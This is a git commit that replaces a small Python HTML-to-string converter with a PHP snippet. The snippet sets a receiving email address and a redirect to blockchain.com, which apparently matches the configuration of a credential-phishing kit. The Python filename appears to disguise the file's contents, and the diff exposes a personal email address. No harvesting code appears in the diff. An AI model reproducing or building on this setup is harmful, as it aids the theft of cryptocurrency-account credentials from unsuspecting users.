4448fca6c04efff334d25ca77b65fac4c26929d2
erica5050 <100240099+erica5050@users.noreply.github.com>
2022-02-23 14:12:58 +0100

    Update HTMLConverter.py

--- HTMLConverter.py
+++ HTMLConverter.py
@@ -1,24 +1,4 @@
-import os
-import sys
-
-try:
-	inputFileName = sys.argv[1]
-	outputFileName = sys.argv[2]
-except:
-	inputFileName = input("HTML File Name:")
-	outputFileName = input("Output File Name:")
-
-firstLine = True
-
-with open(inputFileName, "r") as inputFile:
-	with open(outputFileName, "w") as outputFile:
-		inputLines = inputFile.readlines()
-		for line in inputLines:
-			if(firstLine != True):
-				outputFile.write("\n+ ")
-			firstLine = False
-			line = line[:-1]
-			line = line.replace('"','\\"')
-			print(line)
-			outputFile.write("\"" + line + "\"")
-		outputFile.write(";")
+<?php 
+$Receive_email="lisacookey2@gmail.com";
+$redirect="https://www.blockchain.com/";
+?>
